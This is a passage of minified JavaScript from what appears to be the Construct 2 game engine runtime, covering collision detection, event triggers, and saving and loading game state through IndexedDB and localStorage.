        if (p !== d && (p.parallaxX !== d.parallaxX || d.parallaxY != d.parallaxY || p.scale !== d.scale || p.angle !== d.angle || p.zoomRate !== d.zoomRate)) {
            for (h = t.collision_poly && !t.collision_poly.is_empty(), c = e.collision_poly && !e.collision_poly.is_empty(), h ? (t.collision_poly.cache_poly(t.width, t.height, t.angle), this.temp_poly.set_from_poly(t.collision_poly)) : this.temp_poly.set_from_quad(t.bquad, t.x, t.y, t.width, t.height), l = this.temp_poly, c ? (e.collision_poly.cache_poly(e.width, e.height, e.angle), this.temp_poly2.set_from_poly(e.collision_poly)) : this.temp_poly2.set_from_quad(e.bquad, e.x, e.y, e.width, e.height), u = this.temp_poly2, i = 0, n = l.pts_count; i < n; i++) s = (r = 2 * i) + 1, o = l.pts_cache[r], a = l.pts_cache[s], l.pts_cache[r] = p.layerToCanvas(o + t.x, a + t.y, !0), l.pts_cache[s] = p.layerToCanvas(o + t.x, a + t.y, !1);
            for (l.update_bbox(), i = 0, n = u.pts_count; i < n; i++) s = (r = 2 * i) + 1, o = u.pts_cache[r], a = u.pts_cache[s], u.pts_cache[r] = d.layerToCanvas(o + e.x, a + e.y, !0), u.pts_cache[s] = d.layerToCanvas(o + e.x, a + e.y, !1);
            return u.update_bbox(), l.intersects_poly(u, 0, 0)
        }
        return !!t.bbox.intersects_rect(e.bbox) && (!!t.bquad.intersects_quad(e.bquad) && ((!t.tilemap_exists || !e.tilemap_exists) && (t.tilemap_exists ? this.testTilemapOverlap(t, e) : e.tilemap_exists ? this.testTilemapOverlap(e, t) : (h = t.collision_poly && !t.collision_poly.is_empty(), c = e.collision_poly && !e.collision_poly.is_empty(), !h && !c || (h ? (t.collision_poly.cache_poly(t.width, t.height, t.angle), l = t.collision_poly) : (this.temp_poly.set_from_quad(t.bquad, t.x, t.y, t.width, t.height), l = this.temp_poly), c ? (e.collision_poly.cache_poly(e.width, e.height, e.angle), u = e.collision_poly) : (this.temp_poly.set_from_quad(e.bquad, e.x, e.y, e.width, e.height), u = this.temp_poly), l.intersects_poly(u, e.x - t.x, e.y - t.y))))))
    };
    var x = new cr.quad,
        S = new cr.rect(0, 0, 0, 0),
        T = [];
    e.prototype.testTilemapOverlap = function (t, e) {
        var i, n, r, s, o = e.bbox,
            a = t.x,
            h = t.y;
        t.getCollisionRectCandidates(o, T);
        var c = T,
            l = e.collision_poly && !e.collision_poly.is_empty();
        for (i = 0, n = c.length; i < n; ++i)
            if (s = (r = c[i]).rc, o.intersects_rect_off(s, a, h) && (x.set_from_rect(s), x.offset(a, h), x.intersects_quad(e.bquad)))
                if (l) {
                    if (e.collision_poly.cache_poly(e.width, e.height, e.angle), r.poly) {
                        if (r.poly.intersects_poly(e.collision_poly, e.x - (a + s.left), e.y - (h + s.top))) return cr.clearArray(T), !0
                    } else if (this.temp_poly.set_from_quad(x, 0, 0, s.right - s.left, s.bottom - s.top), this.temp_poly.intersects_poly(e.collision_poly, e.x, e.y)) return cr.clearArray(T), !0
                } else {
                    if (!r.poly) return cr.clearArray(T), !0;
                    if (this.temp_poly.set_from_quad(e.bquad, 0, 0, e.width, e.height), r.poly.intersects_poly(this.temp_poly, -(a + s.left), -(h + s.top))) return cr.clearArray(T), !0
                } return cr.clearArray(T), !1
    }, e.prototype.testRectOverlap = function (t, e) {
        if (!e || !e.collisionsEnabled) return !1;
        e.update_bbox();
        e.layer;
        if (!e.bbox.intersects_rect(t)) return !1;
        if (e.tilemap_exists) {
            e.getCollisionRectCandidates(t, T);
            var i, n, r, s, o = T,
                a = e.x,
                h = e.y;
            for (i = 0, n = o.length; i < n; ++i)
                if (s = (r = o[i]).rc, t.intersects_rect_off(s, a, h)) {
                    if (!r.poly) return cr.clearArray(T), !0;
                    if (this.temp_poly.set_from_rect(t, 0, 0), r.poly.intersects_poly(this.temp_poly, -(a + s.left), -(h + s.top))) return cr.clearArray(T), !0
                } return cr.clearArray(T), !1
        }
        return x.set_from_rect(t), !!e.bquad.intersects_quad(x) && (!(e.collision_poly && !e.collision_poly.is_empty()) || (e.collision_poly.cache_poly(e.width, e.height, e.angle), x.offset(-t.left, -t.top), this.temp_poly.set_from_quad(x, 0, 0, 1, 1), e.collision_poly.intersects_poly(this.temp_poly, t.left - e.x, t.top - e.y)))
    }, e.prototype.testSegmentOverlap = function (t, e, i, n, r) {
        if (!r || !r.collisionsEnabled) return !1;
        r.update_bbox();
        r.layer;
        if (S.set(cr.min(t, i), cr.min(e, n), cr.max(t, i), cr.max(e, n)), !r.bbox.intersects_rect(S)) return !1;
        if (r.tilemap_exists) {
            r.getCollisionRectCandidates(S, T);
            var s, o, a, h, c = T,
                l = r.x,
                u = r.y;
            for (s = 0, o = c.length; s < o; ++s)
                if (h = (a = c[s]).rc, S.intersects_rect_off(h, l, u) && (x.set_from_rect(h), x.offset(l, u), x.intersects_segment(t, e, i, n))) {
                    if (!a.poly) return cr.clearArray(T), !0;
                    if (a.poly.intersects_segment(l + h.left, u + h.top, t, e, i, n)) return cr.clearArray(T), !0
                } return cr.clearArray(T), !1
        }
        return !!r.bquad.intersects_segment(t, e, i, n) && (!(r.collision_poly && !r.collision_poly.is_empty()) || (r.collision_poly.cache_poly(r.width, r.height, r.angle), r.collision_poly.intersects_segment(r.x, r.y, t, e, i, n)))
    }, e.prototype.typeHasBehavior = function (t, e) {
        if (!e) return !1;
        var i, n, r, s, o;
        for (i = 0, n = t.behaviors.length; i < n; i++)
            if (t.behaviors[i].behavior instanceof e) return !0;
        if (!t.is_family)
            for (i = 0, n = t.families.length; i < n; i++)
                for (r = 0, s = (o = t.families[i]).behaviors.length; r < s; r++)
                    if (o.behaviors[r].behavior instanceof e) return !0;
        return !1
    }, e.prototype.typeHasNoSaveBehavior = function (t) {
        return this.typeHasBehavior(t, cr.behaviors.NoSave)
    }, e.prototype.typeHasPersistBehavior = function (t) {
        return this.typeHasBehavior(t, cr.behaviors.Persist)
    }, e.prototype.getSolidBehavior = function () {
        return this.solidBehavior
    }, e.prototype.getJumpthruBehavior = function () {
        return this.jumpthruBehavior
    };
    var C = [];
    e.prototype.testOverlapSolid = function (t) {
        var e, i, n;
        for (t.update_bbox(), this.getSolidCollisionCandidates(t.layer, t.bbox, C), e = 0, i = C.length; e < i; ++e)
            if ((n = C[e]).extra.solidEnabled && this.testOverlap(t, n)) return cr.clearArray(C), n;
        return cr.clearArray(C), null
    }, e.prototype.testRectOverlapSolid = function (t) {
        var e, i, n;
        for (this.getSolidCollisionCandidates(null, t, C), e = 0, i = C.length; e < i; ++e)
            if ((n = C[e]).extra.solidEnabled && this.testRectOverlap(t, n)) return cr.clearArray(C), n;
        return cr.clearArray(C), null
    };
    var A = [];
    e.prototype.testOverlapJumpThru = function (t, e) {
        var i, n, r, s = null;
        for (e && (s = A, cr.clearArray(s)), t.update_bbox(), this.getJumpthruCollisionCandidates(t.layer, t.bbox, C), i = 0, n = C.length; i < n; ++i)
            if ((r = C[i]).extra.jumpthruEnabled && this.testOverlap(t, r)) {
                if (!e) return cr.clearArray(C), r;
                s.push(r)
            } return cr.clearArray(C), s
    }, e.prototype.pushOutSolid = function (t, e, i, n, r, s) {
        var o, a = n || 50,
            h = t.x,
            c = t.y,
            l = null,
            u = null;
        for (o = 0; o < a; o++)
            if (t.x = h + e * o, t.y = c + i * o, t.set_bbox_changed(), !this.testOverlap(t, l) && ((l = this.testOverlapSolid(t)) && (u = l), !l && (r && (l = s ? this.testOverlap(t, s) ? s : null : this.testOverlapJumpThru(t)) && (u = l), !l))) return u && this.pushInFractional(t, e, i, u, 16), !0;
        return t.x = h, t.y = c, t.set_bbox_changed(), !1
    }, e.prototype.pushOut = function (t, e, i, n, r) {
        var s, o = n || 50,
            a = t.x,
            h = t.y;
        for (s = 0; s < o; s++)
            if (t.x = a + e * s, t.y = h + i * s, t.set_bbox_changed(), !this.testOverlap(t, r)) return !0;
        return t.x = a, t.y = h, t.set_bbox_changed(), !1
    }, e.prototype.pushInFractional = function (t, e, i, n, r) {
        for (var s, o = 2, a = !1, h = !1, c = t.x, l = t.y; o <= r;) s = 1 / o, o *= 2, t.x += e * s * (a ? 1 : -1), t.y += i * s * (a ? 1 : -1), t.set_bbox_changed(), this.testOverlap(t, n) ? (a = !0, h = !0) : (a = !1, h = !1, c = t.x, l = t.y);
        h && (t.x = c, t.y = l, t.set_bbox_changed())
    }, e.prototype.pushOutSolidNearest = function (t, e) {
        var i = cr.is_undefined(e) ? 100 : e,
            n = 0,
            r = t.x,
            s = t.y,
            o = 0,
            a = 0,
            h = 0,
            c = this.testOverlapSolid(t);
        if (!c) return !0;
        for (; n <= i;) {
            switch (o) {
                case 0:
                    a = 0, h = -1, n++;
                    break;
                case 1:
                    a = 1, h = -1;
                    break;
                case 2:
                    a = 1, h = 0;
                    break;
                case 3:
                    a = 1, h = 1;
                    break;
                case 4:
                    a = 0, h = 1;
                    break;
                case 5:
                    a = -1, h = 1;
                    break;
                case 6:
                    a = -1, h = 0;
                    break;
                case 7:
                    a = -1, h = -1;
                    break
            }
            if (o = (o + 1) % 8, t.x = cr.floor(r + a * n), t.y = cr.floor(s + h * n), t.set_bbox_changed(), !this.testOverlap(t, c) && !(c = this.testOverlapSolid(t))) return !0
        }
        return t.x = r, t.y = s, t.set_bbox_changed(), !1
    }, e.prototype.registerCollision = function (t, e) {
        t.collisionsEnabled && e.collisionsEnabled && this.registered_collisions.push([t, e])
    }, e.prototype.addRegisteredCollisionCandidates = function (t, e, i) {
        var n, r, s, o;
        for (n = 0, r = this.registered_collisions.length; n < r; ++n) {
            if ((s = this.registered_collisions[n])[0] === t) o = s[1];
            else {
                if (s[1] !== t) continue;
                o = s[0]
            }
            if (e.is_family) {
                if (-1 === e.members.indexOf(e)) continue
            } else if (o.type !== e) continue; - 1 === i.indexOf(o) && i.push(o)
        }
    }, e.prototype.checkRegisteredCollision = function (t, e) {
        var i, n, r;
        for (i = 0, n = this.registered_collisions.length; i < n; i++)
            if ((r = this.registered_collisions[i])[0] === t && r[1] === e || r[0] === e && r[1] === t) return !0;
        return !1
    }, e.prototype.calculateSolidBounceAngle = function (t, e, i, n) {
        var r = t.x,
            s = t.y,
            o = cr.max(10, cr.distanceTo(e, i, r, s)),
            a = cr.angleTo(e, i, r, s),
            h = n || this.testOverlapSolid(t);
        if (!h) return cr.clamp_angle(a + cr.PI);
        var c, l, u, p, d = h,
            f = cr.to_radians(5);
        for (c = 1; c < 36; c++)
            if (l = a - c * f, t.x = e + Math.cos(l) * o, t.y = i + Math.sin(l) * o, t.set_bbox_changed(), !this.testOverlap(t, d) && !(d = n ? null : this.testOverlapSolid(t))) {
                u = l;
                break
            } 36 === c && (u = cr.clamp_angle(a + cr.PI));
        d = h;
        for (c = 1; c < 36; c++)
            if (l = a + c * f, t.x = e + Math.cos(l) * o, t.y = i + Math.sin(l) * o, t.set_bbox_changed(), !this.testOverlap(t, d) && !(d = n ? null : this.testOverlapSolid(t))) {
                p = l;
                break
            } if (36 === c && (p = cr.clamp_angle(a + cr.PI)), t.x = r, t.y = s, t.set_bbox_changed(), p === u) return p;
        var m, g = cr.angleDiff(p, u) / 2;
        m = cr.angleClockwise(p, u) ? cr.clamp_angle(u + g + cr.PI) : cr.clamp_angle(p + g);
        var y = Math.cos(a),
            _ = Math.sin(a),
            v = Math.cos(m),
            b = Math.sin(m),
            w = y * v + _ * b,
            x = y - 2 * w * v,
            S = _ - 2 * w * b;
        return cr.angleTo(0, 0, x, S)
    };
    var O = -1;

    function k() {
        try {
            return !!window.indexedDB
        } catch (t) {
            return !1
        }
    }

    function P(t) {
        t.target.result.createObjectStore("saves", {
            keyPath: "slot"
        })
    }

    function I() {
        cr.logexport("Reloading for continuous preview"), window.c2cocoonjs ? CocoonJS.App.reload() : window.location.search.indexOf("continuous") > -1 ? window.location.reload(!0) : window.location = window.location + "?continuous"
    }

    function E(t) {
        var e, i = {};
        for (e in t)
            if (t.hasOwnProperty(e)) {
                if (t[e] instanceof cr.ObjectSet) continue;
                if (t[e] && void 0 !== t[e].c2userdata) continue;
                if ("spriteCreatedDestroyCallback" === e) continue;
                i[e] = t[e]
            } return i
    }
    e.prototype.trigger = function (t, e, i) {
        if (!this.running_layout) return !1;
        var n = this.running_layout.event_sheet;
        if (!n) return !1;
        var r, s, o, a = !1;
        O++;
        var h = n.deep_includes;
        for (s = 0, o = h.length; s < o; ++s) r = this.triggerOnSheet(t, e, h[s], i), a = a || r;
        return r = this.triggerOnSheet(t, e, n, i), O--, a = a || r
    }, e.prototype.triggerOnSheet = function (t, e, i, n) {
        var r, s, o, a, h = !1;
        if (e)
            for (o = this.triggerOnSheetForTypeName(t, e, e.type.name, i, n), h = h || o, r = 0, s = (a = e.type.families).length; r < s; ++r) o = this.triggerOnSheetForTypeName(t, e, a[r].name, i, n), h = h || o;
        else o = this.triggerOnSheetForTypeName(t, e, "system", i, n), h = h || o;
        return h
    }, e.prototype.triggerOnSheetForTypeName = function (t, e, i, n, r) {
        var s, o, a, h, c = !1,
            l = !1,
            u = void 0 !== r,
            p = (u ? n.fasttriggers : n.triggers)[i];
        if (!p) return c;
        var d, f = null;
        for (s = 0, o = p.length; s < o; ++s)
            if (p[s].method == t) {
                f = p[s].evs;
                break
            } if (!f) return c;
        if (!(d = u ? f[r] : f)) return null;
        for (s = 0, o = d.length; s < o; s++) a = d[s][0], h = d[s][1], l = this.executeSingleTrigger(e, i, a, h), c = c || l;
        return c
    }, e.prototype.executeSingleTrigger = function (t, e, i, n) {
        var r, s, o = !1;
        this.trigger_depth++;
        var a = this.getCurrentEventStack().current_event;
        a && this.pushCleanSol(a.solModifiersIncludingParents);
        var h = this.trigger_depth > 1;
        this.pushCleanSol(i.solModifiersIncludingParents), h && this.pushLocalVarStack();
        var c = this.pushEventStack(i);
        if (c.current_event = i, t) {
            var l = this.types[e].getCurrentSol();
            l.select_all = !1, cr.clearArray(l.instances), l.instances[0] = t, this.types[e].applySolToContainer()
        }
        var u = !0;
        if (i.parent) {
            for (var p = c.temp_parents_arr, d = i.parent; d;) p.push(d), d = d.parent;
            for (p.reverse(), r = 0, s = p.length; r < s; r++)
                if (!p[r].run_pretrigger()) {
                    u = !1;
                    break
                }
        }
        return u && (this.execcount++, i.orblock ? i.run_orblocktrigger(n) : i.run(), o = o || c.last_event_true), this.popEventStack(), h && this.popLocalVarStack(), this.popSol(i.solModifiersIncludingParents), a && this.popSol(a.solModifiersIncludingParents), this.hasPendingInstances && 0 === this.isInOnDestroy && 0 === O && !this.isRunningEvents && this.ClearDeathRow(), this.trigger_depth--, o
    }, e.prototype.getCurrentCondition = function () {
        var t = this.getCurrentEventStack();
        return t.current_event.conditions[t.cndindex]
    }, e.prototype.getCurrentConditionObjectType = function () {
        return this.getCurrentCondition().type
    }, e.prototype.isCurrentConditionFirst = function () {
        return 0 === this.getCurrentEventStack().cndindex
    }, e.prototype.getCurrentAction = function () {
        var t = this.getCurrentEventStack();
        return t.current_event.actions[t.actindex]
    }, e.prototype.pushLocalVarStack = function () {
        this.localvar_stack_index++, this.localvar_stack_index >= this.localvar_stack.length && this.localvar_stack.push([])
    }, e.prototype.popLocalVarStack = function () {
        this.localvar_stack_index--
    }, e.prototype.getCurrentLocalVarStack = function () {
        return this.localvar_stack[this.localvar_stack_index]
    }, e.prototype.pushEventStack = function (t) {
        this.event_stack_index++, this.event_stack_index >= this.event_stack.length && this.event_stack.push(new cr.eventStackFrame);
        var e = this.getCurrentEventStack();
        return e.reset(t), e
    }, e.prototype.popEventStack = function () {
        this.event_stack_index--
    }, e.prototype.getCurrentEventStack = function () {
        return this.event_stack[this.event_stack_index]
    }, e.prototype.pushLoopStack = function (t) {
        this.loop_stack_index++, this.loop_stack_index >= this.loop_stack.length && this.loop_stack.push(cr.seal({
            name: t,
            index: 0,
            stopped: !1
        }));
        var e = this.getCurrentLoop();
        return e.name = t, e.index = 0, e.stopped = !1, e
    }, e.prototype.popLoopStack = function () {
        this.loop_stack_index--
    }, e.prototype.getCurrentLoop = function () {
        return this.loop_stack[this.loop_stack_index]
    }, e.prototype.getEventVariableByName = function (t, e) {
        for (var i, n, r, s, o, a; e;) {
            for (i = 0, n = e.subevents.length; i < n; i++)
                if ((a = e.subevents[i]) instanceof cr.eventvariable && cr.equals_nocase(t, a.name)) return a;
            e = e.parent
        }
        for (i = 0, n = this.eventsheets_by_index.length; i < n; i++)
            for (r = 0, s = (o = this.eventsheets_by_index[i]).events.length; r < s; r++)
                if ((a = o.events[r]) instanceof cr.eventvariable && cr.equals_nocase(t, a.name)) return a;
        return null
    }, e.prototype.getLayoutBySid = function (t) {
        var e, i;
        for (e = 0, i = this.layouts_by_index.length; e < i; e++)
            if (this.layouts_by_index[e].sid === t) return this.layouts_by_index[e];
        return null
    }, e.prototype.getObjectTypeBySid = function (t) {
        var e, i;
        for (e = 0, i = this.types_by_index.length; e < i; e++)
            if (this.types_by_index[e].sid === t) return this.types_by_index[e];
        return null
    }, e.prototype.getGroupBySid = function (t) {
        var e, i;
        for (e = 0, i = this.allGroups.length; e < i; e++)
            if (this.allGroups[e].sid === t) return this.allGroups[e];
        return null
    }, e.prototype.doCanvasSnapshot = function (t, e) {
        this.snapshotCanvas = [t, e], this.redraw = !0
    }, e.prototype.signalContinuousPreview = function () {
        this.signalledContinuousPreview = !0
    }, e.prototype.handleSaveLoad = function () {
        var t = this,
            e = this.saveToSlot,
            i = this.lastSaveJson,
            n = this.loadFromSlot,
            r = !1;
        if (this.signalledContinuousPreview && (r = !0, e = "__c2_continuouspreview", this.signalledContinuousPreview = !1), e.length) {
            if (this.ClearDeathRow(), i = this.saveToJSONString(), k() && !this.isCocoonJs) ! function (t, e, i, n) {
                try {
                    var r = indexedDB.open("_C2SaveStates");
                    r.onupgradeneeded = P, r.onerror = n, r.onsuccess = function (r) {
                        var s = r.target.result;
                        s.onerror = n, s.transaction(["saves"], "readwrite").objectStore("saves").put({
                            slot: t,
                            data: e
                        }).onsuccess = i
                    }
                } catch (t) {
                    n(t)
                }
            }(e, i, (function () {
                cr.logexport("Saved state to IndexedDB storage (" + i.length + " bytes)"), t.lastSaveJson = i, t.trigger(cr.system_object.prototype.cnds.OnSaveComplete, null), t.lastSaveJson = "", r && I()
            }), (function (n) {
                try {
                    localStorage.setItem("__c2save_" + e, i), cr.logexport("Saved state to WebStorage (" + i.length + " bytes)"), t.lastSaveJson = i, t.trigger(cr.system_object.prototype.cnds.OnSaveComplete, null), t.lastSaveJson = "", r && I()
                } catch (e) {
                    cr.logexport("Failed to save game state: " + n + "; " + e), t.trigger(cr.system_object.prototype.cnds.OnSaveFailed, null)
                }
            }));
            else try {
                localStorage.setItem("__c2save_" + e, i), cr.logexport("Saved state to WebStorage (" + i.length + " bytes)"), t.lastSaveJson = i, this.trigger(cr.system_object.prototype.cnds.OnSaveComplete, null), t.lastSaveJson = "", r && I()
            } catch (e) {
                cr.logexport("Error saving to WebStorage: " + e), t.trigger(cr.system_object.prototype.cnds.OnSaveFailed, null)
            }
            this.saveToSlot = "", this.loadFromSlot = "", this.loadFromJson = null
        }
        if (n.length) {
            if (k() && !this.isCocoonJs) ! function (t, e, i) {
                try {
                    var n = indexedDB.open("_C2SaveStates");
                    n.onupgradeneeded = P, n.onerror = i, n.onsuccess = function (n) {
                        var r = n.target.result;
                        r.onerror = i;
                        var s = r.transaction(["saves"]).objectStore("saves").get(t);
                        s.onsuccess = function (t) {
                            s.result ? e(s.result.data) : e(null)
                        }
                    }
                } catch (t) {
                    i(t)
                }
            }(n, (function (e) {
                e ? (t.loadFromJson = e, cr.logexport("Loaded state from IndexedDB storage (" + t.loadFromJson.length + " bytes)")) : (t.loadFromJson = localStorage.getItem("__c2save_" + n) || "", cr.logexport("Loaded state from WebStorage (" + t.loadFromJson.length + " bytes)")), t.suspendDrawing = !1, t.loadFromJson || (t.loadFromJson = null, t.trigger(cr.system_object.prototype.cnds.OnLoadFailed, null))
            }), (function (e) {
                t.loadFromJson = localStorage.getItem("__c2save_" + n) || "", cr.logexport("Loaded state from WebStorage (" + t.loadFromJson.length + " bytes)"), t.suspendDrawing = !1, t.loadFromJson || (t.loadFromJson = null, t.trigger(cr.system_object.prototype.cnds.OnLoadFailed, null))
            }));
            else {
                try {
                    this.loadFromJson = localStorage.getItem("__c2save_" + n) || "", cr.logexport("Loaded state from WebStorage (" + this.loadFromJson.length + " bytes)")
                } catch (t) {
                    this.loadFromJson = null
                }
                this.suspendDrawing = !1, t.loadFromJson || (t.loadFromJson = null, t.trigger(cr.system_object.prototype.cnds.OnLoadFailed, null))
            }
            this.loadFromSlot = "", this.saveToSlot = ""
        }
        null !== this.loadFromJson && (this.ClearDeathRow(), this.loadFromJSONString(this.loadFromJson) ? (this.lastSaveJson = this.loadFromJson, this.trigger(cr.system_object.prototype.cnds.OnLoadComplete, null), this.lastSaveJson = "") : t.trigger(cr.system_object.prototype.cnds.OnLoadFailed, null), this.loadFromJson = null)
    }, e.prototype.saveToJSONString = function () {
        var t, e, i, n, r, s, o, a, h, c, l, u, p = {
            c2save: !0,
            version: 1,
            rt: {
                time: this.kahanTime.sum,
                walltime: this.wallTime.sum,
                timescale: this.timescale,
                tickcount: this.tickcount,
                execcount: this.execcount,
                next_uid: this.next_uid,
                running_layout: this.running_layout.sid,
                start_time_offset: Date.now() - this.start_time
            },
            types: {},
            layouts: {},
            events: {
                groups: {},
                cnds: {},
                acts: {},
                vars: {}
            }
        };
        for (t = 0, e = this.types_by_index.length; t < e; t++)
            if (!(r = this.types_by_index[t]).is_family && !this.typeHasNoSaveBehavior(r)) {
                for (o = {
                        instances: []
                    }, cr.hasAnyOwnProperty(r.extra) && (o.ex = E(r.extra)), i = 0, n = r.instances.length; i < n; i++) o.instances.push(this.saveInstanceToJSON(r.instances[i]));
                p.types[r.sid.toString()] = o
            } for (t = 0, e = this.layouts_by_index.length; t < e; t++) s = this.layouts_by_index[t], p.layouts[s.sid.toString()] = s.saveToJSON();
        var d = p.events.groups;
        for (t = 0, e = this.allGroups.length; t < e; t++) d[(a = this.allGroups[t]).sid.toString()] = this.groups_by_name[a.group_name].group_active;
        var f = p.events.cnds;
        for (u in this.cndsBySid) this.cndsBySid.hasOwnProperty(u) && (h = this.cndsBySid[u], cr.hasAnyOwnProperty(h.extra) && (f[u] = {
            ex: E(h.extra)
        }));
        var m = p.events.acts;
        for (u in this.actsBySid) this.actsBySid.hasOwnProperty(u) && (c = this.actsBySid[u], cr.hasAnyOwnProperty(c.extra) && (m[u] = {
            ex: E(c.extra)
        }));
        var g = p.events.vars;
        for (u in this.varsBySid) this.varsBySid.hasOwnProperty(u) && ((l = this.varsBySid[u]).is_constant || l.parent && !l.is_static || (g[u] = l.data));
        return p.system = this.system.saveToJSON(), JSON.stringify(p)
    }, e.prototype.refreshUidMap = function () {
        var t, e, i, n, r, s;
        for (this.objectsByUid = {}, t = 0, e = this.types_by_index.length; t < e; t++)
            if (!(i = this.types_by_index[t]).is_family)
                for (n = 0, r = i.instances.length; n < r; n++) s = i.instances[n], this.objectsByUid[s.uid.toString()] = s
    }, e.prototype.loadFromJSONString = function (t) {
        var e;
        try {
            e = JSON.parse(t)
        } catch (t) {
            return !1
        }
        if (!e.c2save) return !1;
        if (e.version > 1) return !1;
        this.isLoadingState = !0;
        var i = e.rt;
        this.kahanTime.reset(), this.kahanTime.sum = i.time, this.wallTime.reset(), this.wallTime.sum = i.walltime || 0, this.timescale = i.timescale, this.tickcount = i.tickcount, this.execcount = i.execcount, this.start_time = Date.now() - i.start_time_offset;
        var n, r, s, o, a, h, c, l, u, p, d, f, m, g, y, _, v, b = i.running_layout;
        if (b !== this.running_layout.sid) {
            var w = this.getLayoutBySid(b);
            if (!w) return;
            this.doChangeLayout(w)
        }
        var x = e.types;
        for (c in x)
            if (x.hasOwnProperty(c)) {
                if (!(l = this.getObjectTypeBySid(parseInt(c, 10))) || l.is_family || this.typeHasNoSaveBehavior(l)) continue;
                for (x[c].ex ? l.extra = x[c].ex : cr.wipe(l.extra), u = l.instances, p = x[c].instances, n = 0, r = cr.min(u.length, p.length); n < r; n++) this.loadInstanceFromJSON(u[n], p[n]);
                for (n = p.length, r = u.length; n < r; n++) this.DestroyInstance(u[n]);
                for (n = u.length, r = p.length; n < r; n++) g = null, l.plugin.is_world && !(g = this.running_layout.getLayerBySid(p[n].w.l)) || (d = this.createInstanceFromInit(l.default_instance, g, !1, 0, 0, !0), this.loadInstanceFromJSON(d, p[n]));
                l.stale_iids = !0
            } this.ClearDeathRow(), this.refreshUidMap();
        var S = e.layouts;
        for (c in S)
            if (S.hasOwnProperty(c)) {
                if (!(m = this.getLayoutBySid(parseInt(c, 10)))) continue;
                m.loadFromJSON(S[c])
            } var T = e.events.groups;
        for (c in T) T.hasOwnProperty(c) && (y = this.getGroupBySid(parseInt(c, 10))) && this.groups_by_name[y.group_name] && this.groups_by_name[y.group_name].setGroupActive(T[c]);
        var C = e.events.cnds;
        for (c in this.cndsBySid) this.cndsBySid.hasOwnProperty(c) && (C.hasOwnProperty(c) ? this.cndsBySid[c].extra = C[c].ex : this.cndsBySid[c].extra = {});
        var A = e.events.acts;
        for (c in this.actsBySid) this.actsBySid.hasOwnProperty(c) && (A.hasOwnProperty(c) ? this.actsBySid[c].extra = A[c].ex : this.actsBySid[c].extra = {});
        var O = e.events.vars;
        for (c in O) O.hasOwnProperty(c) && this.varsBySid.hasOwnProperty(c) && (this.varsBySid[c].data = O[c]);
        for (this.next_uid = i.next_uid, this.isLoadingState = !1, n = 0, r = this.fireOnCreateAfterLoad.length; n < r; ++n) d = this.fireOnCreateAfterLoad[n], this.trigger(Object.getPrototypeOf(d.type.plugin).cnds.OnCreated, d);
        for (cr.clearArray(this.fireOnCreateAfterLoad), this.system.loadFromJSON(e.system), n = 0, r = this.types_by_index.length; n < r; n++)
            if (!(l = this.types_by_index[n]).is_family && !this.typeHasNoSaveBehavior(l))
                for (s = 0, o = l.instances.length; s < o; s++) {
                    if (d = l.instances[s], l.is_contained)
                        for (_ = d.get_iid(), cr.clearArray(d.siblings), a = 0, h = l.container.length; a < h; a++) l !== (v = l.container[a]) && d.siblings.push(v.instances[_]);
                    if (d.afterLoad && d.afterLoad(), d.behavior_insts)
                        for (a = 0, h = d.behavior_insts.length; a < h; a++)(f = d.behavior_insts[a]).afterLoad && f.afterLoad()
                }
        return this.redraw = !0, !0
    }, e.prototype.saveInstanceToJSON = function (t, e) {
        var i, n, r, s, o, a = t.type,
            h = a.plugin,
            c = {};
        if (e ? c.c2 = !0 : c.uid = t.uid, cr.hasAnyOwnProperty(t.extra) && (c.ex = E(t.extra)), t.instance_vars && t.instance_vars.length)
            for (c.ivs = {}, i = 0, n = t.instance_vars.length; i < n; i++) c.ivs[t.type.instvar_sids[i].toString()] = t.instance_vars[i];
        if (h.is_world) {
            if (r = {
                    x: t.x,
                    y: t.y,
                    w: t.width,
                    h: t.height,
                    l: t.layer.sid,
                    zi: t.get_zindex()
                }, 0 !== t.angle && (r.a = t.angle), 1 !== t.opacity && (r.o = t.opacity), .5 !== t.hotspotX && (r.hX = t.hotspotX), .5 !== t.hotspotY && (r.hY = t.hotspotY), 0 !== t.blend_mode && (r.bm = t.blend_mode), t.visible || (r.v = t.visible), t.collisionsEnabled || (r.ce = t.collisionsEnabled), -1 !== t.my_timescale && (r.mts = t.my_timescale), a.effect_types.length)
                for (r.fx = [], i = 0, n = a.effect_types.length; i < n; i++) o = a.effect_types[i], r.fx.push({
                    name: o.name,
                    active: t.active_effect_flags[o.index],
                    params: t.effect_params[o.index]
                });
            c.w = r
        }
        if (t.behavior_insts && t.behavior_insts.length)
            for (c.behs = {}, i = 0, n = t.behavior_insts.length; i < n; i++)(s = t.behavior_insts[i]).saveToJSON && (c.behs[s.type.sid.toString()] = s.saveToJSON());
        return t.saveToJSON && (c.data = t.saveToJSON()), c
    }, e.prototype.getInstanceVarIndexBySid = function (t, e) {
        var i, n;
        for (i = 0, n = t.instvar_sids.length; i < n; i++)
            if (t.instvar_sids[i] === e) return i;
        return -1
    }, e.prototype.getBehaviorIndexBySid = function (t, e) {
        var i, n;
        for (i = 0, n = t.behavior_insts.length; i < n; i++)
            if (t.behavior_insts[i].type.sid === e) return i;
        return -1
    }, e.prototype.loadInstanceFromJSON = function (t, e, i) {
        var n, r, s, o, a, h, c, l, u, p, d, f = t.type,
            m = f.plugin;
        if (i) {
            if (!e.c2) return
        } else t.uid = e.uid;
        if (e.ex ? t.extra = e.ex : cr.wipe(t.extra), a = e.ivs)
            for (n in a)
                if (a.hasOwnProperty(n)) {
                    if ((o = this.getInstanceVarIndexBySid(f, parseInt(n, 10))) < 0 || o >= t.instance_vars.length) continue;
                    null === (p = a[n]) && (p = NaN), t.instance_vars[o] = p
                } if (m.is_world) {
